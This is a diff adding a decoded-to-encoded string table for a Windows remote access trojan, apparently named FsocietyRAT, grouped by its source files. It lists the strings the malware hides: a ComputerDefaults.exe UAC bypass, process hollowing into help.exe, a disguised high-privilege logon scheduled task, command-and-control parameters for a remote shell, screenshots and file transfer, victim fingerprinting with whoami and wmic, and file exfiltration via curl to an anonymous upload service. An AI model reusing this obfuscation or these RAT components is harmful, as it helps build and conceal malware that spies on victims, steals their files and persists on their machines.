@@ -1,0 +1,123 @@
+Decoded					:					Encoded
+
+----------------------------------------------- Bypass_UAC.cpp -----------------------------------------------
+
+
+C:\\Windows\\System32\\ComputerDefaults.exe : \C32emstSys\owndWi:\eCexs.ltauefrDtepuom 1 
+
+\\ComputerDefaults.exe : DeerutmpCoe\exs.ltauf 2
+ 
+\\Secur32.dll : r3cuSel\dl2. 3
+
+C:\\Windows \\ : ndWi:\\\\Cs ow 4
+
+.sys :
+
+.dll : 
+
+----------------------------------------------- Bypass_UAC.h -----------------------------------------------
+
+Secur32 : cuSe32r
+
+----------------------------------------------- Control.cpp -----------------------------------------------
+
+Result+Is+Empty..+So+the+command+may+not+found! : he+tSo.+y.ptEms++IltsuRed!unfot+noy+mad+anmmco+
+
+&remote_shell= : e_otem&rl=elsh
+
+&task_scheduler=Create+Task+Success! : re=Ceruledch_sskta!&ssceuc+SskTae+at
+
+&task_scheduler=Create+Task+Failed! : Crr=leduhesck_as&td!leai+FskTae+ate
+
+&task_scheduler=Delete+Task+Success! : el=Deruledch_sskta!&ssceuc+SskTae+et
+
+&task_scheduler=Delete+Task+Failed! : Der=leduhesck_as&td!leai+FskTae+etl
+
+sjfo34fu9c.png : fu34fosjng.p9c
+
+&screenshot= : enresc=&otsh
+
+dir /b : r di/b
+
+&file_explorer= : exe_il&fr=relop
+
+&download_file= : oanlow&de=il_fd
+
+&upload_file=Upload+File+Success : loUpe=il_fadloups&esccSue+il+Fad
+
+&upload_file=Upload+File+Failed : pl=Ulefid_oapl&uedilFae+il+Fado
+
+----------------------------------------------- CURL.cpp -----------------------------------------------
+
+http://10.0.0.5/FsocietyRATWebsites/FsocietyRedirectWebsite/redirectPage.html : so/FesitbsWeATyRetciso/F.5.0.010//p:ttlhtm.hgePactrediree/itbsWectrediRetyiec
+
+wmic nic where PhysicalAdapter=True get MACAddress | select -Skip 1 -First 2 : et gueTrr=teapAdalicysPhe erwhc nic mi2wt rsFi - 1ipSk -ctlese| s esdrAdAC M
+
+404 Not Found : ot N04d4unFo
+
+ident.me : ntdeei.m
+
+whoami : oawhmi
+
+wmic path win32_VideoController get name : eoid_V32in wthpac miewam net gerllrontCo
+
+&ip= : ip=&
+
+&pc_name= : _npc=&mea
+
+&gpu= : gp=&u
+
+?bot= : bo=?t
+
+curl : urlc
+
+"curl " : ur cl
+
+uploads : loupdsa
+
+Not Found : FotdNuno
+
+curl -F \"file=@ : F  -rlcu=@lefi\"
+
+https://api.anonfiles.com/upload : nfno.api/a:/psttdhoapl/uom.cesil
+
+status\":true : s\"tutaesru:t
+
+https : ttshp
+
+----------------------------------------------- Keylogger.cpp -----------------------------------------------
+
+
+----------------------------------------------- Process Hollowing.cpp -----------------------------------------------
+
+C:\\Windows\\SysWOW64\\help.exe : sWSys\\owndWi:\\eCexp.el\\h64OW
+
+----------------------------------------------- RAT.cpp -----------------------------------------------
+
+WindowsSecurityTask : ecsSowndWiskTatyriu
+
+help.exe : p.elehex
+
+----------------------------------------------- TaskSchduler.cpp -----------------------------------------------
+
+schtasks /Query /TN \"Microsoft\\Windows\\Security\\ : crMi \"TN / ryue / Qs sktach\\styricuSes\\owndWit\\ofos
+
+schtasks /Create /SC ONLOGON /TN \"Microsoft\\Windows\\Security\\ : /TN GOLOONC /Se atre/Cs sktach\\styricuSes\\owndWit\\ofoscrMi \"N
+
+/RL HIGHEST : HIL /RSTHEG
+
+schtasks /Delete /TN : /Ds sktachNs/Te etel
+
+----------------------------------------------- ADS.cpp -----------------------------------------------
+
+C:\\Users\\ : Us:\\Crse
+
+----------------------------------------------- Tools.h -----------------------------------------------
+
+WindowsSecurityTask : ecsSowndWiskTatyriu
+
+delete_path : teledethpa_
+
+C:\\Windows \\System32 : s owndWi:\2Cm3teys\S
+
+WindowsSecurityTaskDriver : ricuSewsdoinrWverikDasyTt
